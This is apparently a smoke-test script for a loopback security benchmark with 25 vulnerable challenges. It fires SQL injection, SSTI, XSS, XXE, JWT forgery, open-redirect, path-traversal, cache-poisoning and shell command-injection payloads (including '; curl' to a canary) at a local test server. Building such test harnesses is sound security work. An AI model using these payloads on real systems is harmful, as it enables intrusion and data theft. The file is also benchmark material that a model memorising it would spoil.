// Smoke test for the XBEN-25 server: every challenge is exercised once (exploit + baseline) on loopback.
// Run: node benchmarks/xben-25/smoke.ts
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { once } from 'node:events'
import type { AddressInfo } from 'node:net'
import { loadXben25Manifest, startXben25Server } from './server.ts'
import { b64u } from './core.ts'

const manifest = loadXben25Manifest()
assert.equal(manifest.challenges.length, 25)
assert.equal(new Set(manifest.challenges.map(c => c.id)).size, 25)
assert.equal(new Set(manifest.challenges.map(c => c.flagMarker)).size, 25)

const hits: string[] = []
const canary = createServer((req, res) => { hits.push(req.url ?? ''); res.end('canary-ok') })
canary.listen(0, '127.0.0.1')
await once(canary, 'listening')
const canaryUrl = (tag: string) => `http://127.0.0.1:${(canary.address() as AddressInfo).port}/c/${tag}`

const srv = await startXben25Server()
const { origin, personas, markers } = srv
const m = (n: number) => markers[`xben-${String(n).padStart(2, '0')}`]
const auth = (p: string): Record<string, string> => ({ Authorization: personas[p].token })
const get = (path: string, headers: Record<string, string> = {}) => fetch(origin + path, { headers, redirect: 'manual' })
const text = async (r: Response) => r.text()
let checks = 0
const ok = (cond: unknown, msg: string) => { checks += 1; assert.ok(cond, msg) }
const OR = encodeURIComponent("' OR '1'='1")

try {
  // discovery
  for (const p of ['/', '/robots.txt', '/sitemap.xml', '/openapi.json', '/app.js', '/.well-known/openid-configuration', '/.well-known/jwks.json', '/health']) {
    ok((await get(p)).status === 200, `discovery ${p}`)
  }
  ok((await get('/')).headers.get('set-cookie')?.includes('xben_sid='), 'home sets session cookie')

  // 01 query
  ok(!(await text(await get('/api/products?category=books'))).includes(m(1)), '01 baseline clean')
  ok((await text(await get(`/api/products?category=books${OR}`))).includes(m(1)), '01 OR true')
  ok(JSON.parse(await text(await get(`/api/products?category=${encodeURIComponent("books' AND 5=5-- -")}`))).count === 2, '01 AND true')
  ok(JSON.parse(await text(await get(`/api/products?category=${encodeURIComponent("books' AND 5=6-- -")}`))).count === 0, '01 AND false')
  ok((await get(`/api/products?category=${encodeURIComponent("books'")}`)).status === 500, '01 error')
  // 02 json OR-branch
  const post = (path: string, body: string, headers: Record<string, string>) => fetch(origin + path, { method: 'POST', body, headers })
  const j2 = async (term: string) => JSON.parse(await text(await post('/api/search', JSON.stringify({ term }), { 'Content-Type': 'application/json' })))
  ok((await j2("guides' OR 7=7-- -")).count === 4, '02 OR true')
  ok((await j2("guides' OR 7=8-- -")).count === 2, '02 OR false = baseline')
  // 03 form
  const f3 = await text(await post('/search/form', new URLSearchParams({ q: "manuals' OR 3=3-- -" }).toString(), { 'Content-Type': 'application/x-www-form-urlencoded' }))
  ok(f3.includes(m(3)), '03 form')
  // 04 path
  ok((await text(await get(`/api/items/${encodeURIComponent("sku-100' OR 1=1-- -")}`))).includes(m(4)), '04 path')
  // 05 header
  ok((await text(await get('/api/track', { 'X-Tracking-Id': "trk-100' OR 1=1-- -" }))).includes(m(5)), '05 header')
  // 06 xml
  const x6 = await text(await post('/api/xml/lookup', "<lookup><name>atlas' OR 'a'='a</name></lookup>", { 'Content-Type': 'application/xml' }))
  ok(x6.includes(m(6)), '06 xml')
  // 07 graphql variable
  const gq = 'query($category: String){ products(category: $category){ id name category } }'
  const g7 = await text(await post('/graphql', JSON.stringify({ query: gq, variables: { category: "gadgets' OR 1=1-- -" } }), { 'Content-Type': 'application/json' }))
  ok(g7.includes(m(7)), '07 graphql var')
  // 08 time-blind
  const t0 = Date.now()
  await get('/api/orders/lookup?ref=ref-100')
  const baseMs = Date.now() - t0
  const t1 = Date.now()
  const r8 = await text(await get(`/api/orders/lookup?ref=${encodeURIComponent("ref-100' AND (SELECT 1 FROM pg_sleep(1.6)) IS NULL-- -")}`))
  const delayMs = Date.now() - t1
  ok(baseMs < 500 && delayMs >= 1500 && delayMs < 3500 && !r8.includes(m(8)), `08 time diff base=${baseMs} delay=${delayMs}`)
  // 09 csrf
  const home = await get('/')
  const cookie = (home.headers.get('set-cookie') ?? '').split(';')[0]
  const csrf = /name="_csrf" value="([a-f0-9]+)"/.exec(await text(home))?.[1] ?? ''
  const form = (extra: Record<string, string>) => new URLSearchParams({ q: "invoices' OR 2=2-- -", ...extra }).toString()
  const ct = { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookie }
  ok((await post('/account/search', form({}), ct)).status === 403, '09 missing csrf -> 403')
  ok((await text(await post('/account/search', form({ _csrf: csrf }), ct))).includes(m(9)), '09 csrf ok')
  ok((await text(await post('/account/search', form({}), { ...ct, 'X-CSRF-Token': csrf }))).includes(m(9)), '09 csrf header')
  // 10 idor
  ok((await get('/api/orders/1001')).status === 401, '10 anon 401')
  ok(!(await text(await get('/api/orders/1001', auth('persona_a')))).includes(m(10)), '10 owner clean')
  ok((await text(await get('/api/orders/1001', auth('persona_b')))).includes(m(10)), '10 idor')
  // 11 graphql bola
  const iq = 'query($id: ID!){ invoice(id: $id){ id total memo owner { id name } } }'
  const g11 = await text(await post('/graphql', JSON.stringify({ query: iq, variables: { id: '5001' } }), { 'Content-Type': 'application/json', ...auth('persona_b') }))
  ok(g11.includes(m(11)), '11 graphql bola')
  const intro = await text(await post('/graphql', JSON.stringify({ query: '{__schema{queryType{name} types{name}}}' }), { 'Content-Type': 'application/json' }))
  ok(intro.includes('"Invoice"'), '11 introspection')
  ok((await text(await post('/graphql', JSON.stringify({ query: '{__typenam}' }), { 'Content-Type': 'application/json' }))).includes('Did you mean'), '11 suggestions')
  // 12 bfla
  ok((await text(await post('/api/admin/users/u-2001/promote', '', auth('viewer')))).includes(m(12)), '12 bfla')
  ok((await post('/api/admin/users/u-2001/promote', '', {})).status === 401, '12 anon 401')
  // 13 ssti
  const s13 = await text(await get(`/greet?name=${encodeURIComponent('{{7*191}}')}`))
  ok(s13.includes('1337') && s13.includes(m(13)), '13 ssti')
  ok(!(await text(await get('/greet?name=guest'))).includes(m(13)), '13 baseline clean')
  // 14 ssrf (loopback canary only; external host refused without any request)
  const before14 = hits.length
  ok((await text(await get(`/api/fetch?url=${encodeURIComponent(canaryUrl('ssrf'))}`))).includes(m(14)) && hits.length === before14 + 1, '14 ssrf canary hit')
  ok((await get(`/api/fetch?url=${encodeURIComponent('http://example.com/')}`)).status === 403, '14 external refused')
  ok((await get(`/api/fetch?url=${encodeURIComponent('http://169.254.169.254/')}`)).status === 403, '14 metadata refused')
  // 15 xss
  ok((await text(await get(`/search?q=${encodeURIComponent('<b>x</b>')}`))).includes(m(15)), '15 reflected')
  // 16 wizard
  ok((await text(await get('/wizard'))).includes('id="display-name"'), '16 wizard page')
  ok((await text(await get(`/api/wizard/confirm?name=${encodeURIComponent('<i>x')}`))).includes(m(16)), '16 sink marker')
  // 17 second order
  const c17 = await post('/api/comments', JSON.stringify({ body: 'gso123 <img src=x>' }), { 'Content-Type': 'application/json', ...auth('persona_a') })
  ok(c17.status === 201, '17 plant')
  const page17 = await text(await get('/comments', auth('persona_b')))
  ok(page17.includes('gso123 <img src=x>') && page17.includes(m(17)), '17 surfaced')
  // 18 xxe
  const before18 = hits.length
  const xml18 = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${canaryUrl('xxe')}">]><root>&gx;</root>`
  ok((await text(await post('/api/xml/import', xml18, { 'Content-Type': 'application/xml' }))).includes(m(18)) && hits.length === before18 + 1, '18 xxe canary')
  const fileEnt = await text(await post('/api/xml/import', '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY f SYSTEM "file:///etc/hostname">]><r>&f;</r>', { 'Content-Type': 'application/xml' }))
  ok(!fileEnt.includes(m(18)), '18 file entity ignored')
  // 19 jwt
  const jwt = personas.persona_a.jwt as string
  const [h, p] = jwt.split('.')
  const none = `${b64u(JSON.stringify({ alg: 'none', typ: 'JWT' }))}.${p}.`
  const stripped = `${h}.${p}.`
  const swapped = `${b64u(JSON.stringify({ alg: 'none' }))}.${b64u(JSON.stringify({ sub: 'u-1000', role: 'admin' }))}.`
  const jwtGet = (t: string) => get('/api/jwt/profile', { Authorization: `Bearer ${t}` })
  ok(!(await text(await jwtGet(jwt))).includes(m(19)), '19 valid clean')
  ok((await text(await jwtGet(none))).includes(m(19)), '19 alg none')
  ok((await text(await jwtGet(stripped))).includes(m(19)), '19 strip signature')
  ok((await text(await jwtGet(swapped))).includes('"role":"admin"'), '19 claim swap')
  ok((await jwtGet(`${h}.${p}.AAAA`)).status === 401, '19 bad sig 401')
  // 20 jku
  const before20 = hits.length
  const jku = `${b64u(JSON.stringify({ alg: 'HS256', typ: 'JWT', jku: canaryUrl('jku') }))}.${p}.AAAA`
  ok((await get('/api/jwt/jku-profile', { Authorization: `Bearer ${jku}` })).status === 401 && hits.length === before20 + 1, '20 jku canary fetched')
  // 21 oauth
  const oauth = (redirect: string, extra = '') => get(`/oauth/authorize?client_id=web&response_type=code&redirect_uri=${encodeURIComponent(redirect)}&code_challenge_method=S256&code_challenge=abc${extra}`)
  const good = await oauth('http://app.client.test/cb')
  ok(good.status === 302 && !(good.headers.get('location') ?? '').includes(m(21)), '21 exact redirect ok')
  for (const bad of ['http://app.client.test@evil.invalid/cb', 'https://app.client.test.evil.invalid/cb', 'https://evil-app.client.test/cb']) {
    const r = await oauth(bad)
    ok(r.status === 302 && (r.headers.get('location') ?? '').includes(m(21)), `21 accepted ${bad}`)
  }
  ok((await oauth('https://unrelated-control.invalid/cb')).status === 400, '21 control rejected')
  // 22 path traversal
  const dl = (n: string) => get(`/api/files/download?name=${n}`)
  ok(!(await text(await dl('report.txt'))).includes(m(22)), '22 baseline')
  ok((await dl(encodeURIComponent('../../private/secret.txt'))).status === 404, '22 plain traversal filtered')
  ok((await text(await dl(encodeURIComponent('....//private/secret.txt')))).includes(m(22)), '22 ....// bypass')
  ok((await text(await dl(encodeURIComponent('%2e%2e%2fprivate/secret.txt')))).includes(m(22)), '22 double decode bypass')
  ok((await dl(encodeURIComponent('....//....//....//etc/passwd'))).status === 404, '22 stays inside virtual fs')
  // 23 mass assignment
  const patch = (b: unknown) => fetch(origin + '/api/profile', { method: 'PATCH', body: JSON.stringify(b), headers: { 'Content-Type': 'application/json', ...auth('persona_a') } })
  ok(!(await text(await get('/api/profile', auth('persona_a')))).includes(m(23)), '23 baseline')
  ok((await text(await patch({ role: 'admin' }))).includes(m(23)), '23 overpost')
  srv.resetState()
  ok(!(await text(await get('/api/profile', auth('persona_a')))).includes(m(23)), '23 reset restores')
  // 24 cache
  const gcb = '0b1c2d3e-4f50-4a6b-8c7d-9e0f1a2b3c4d'
  const poison = await get(`/cache/banner?_gcb=${gcb}`, { 'X-Forwarded-Host': 'poison.test' })
  ok(poison.headers.get('x-cache') === 'MISS', '24 poison miss')
  const victim = await get(`/cache/banner?_gcb=${gcb}`)
  const victimBody = await text(victim)
  ok(victim.headers.get('x-cache') === 'HIT' && victim.headers.get('age') === '5' && victimBody.includes('poison.test') && victimBody.includes(m(24)), '24 poison persisted')
  const clean = await text(await get('/cache/banner?_gcb=11111111-2222-3333-4444-555555555555'))
  ok(!clean.includes('poison.test'), '24 different buster is clean')
  await get('/account/summary/x.css?_gcb=aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee', auth('persona_a'))
  const dec = await get('/account/summary/x.css?_gcb=aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee')
  ok(dec.status === 200 && dec.headers.get('x-cache') === 'HIT' && (await text(dec)).includes(m(24)), '24 deception')
  // 25 rce oracle
  const ping = async (host: string) => JSON.parse(await text(await get(`/api/diagnostics/ping?host=${encodeURIComponent(host)}`))) as { output: string; marker?: string }
  ok(!(await ping('127.0.0.1')).marker, '25 baseline')
  const r25 = await ping('127.0.0.1; expr 7 \\* 191')
  ok(r25.output.includes('1337') && r25.marker === m(25), '25 expr after ;')
  ok((await ping('$(expr 31 \\* 43)')).output.includes('1333'), '25 command substitution')
  ok((await ping('$(echo ab)$(echo cd)')).output.includes('abcd'), '25 split echo')
  const before25 = hits.length
  await ping(`127.0.0.1; curl ${canaryUrl('rce')}`)
  ok(hits.length === before25 + 1, '25 curl sim hits loopback canary')
  await ping('127.0.0.1; curl http://example.com/')
  ok(hits.length === before25 + 1, '25 curl sim refuses external')

  console.log(`xben-25 smoke OK (${checks} checks, origin ${origin})`)
} finally {
  await srv.close()
  canary.close()
  canary.closeAllConnections()
}
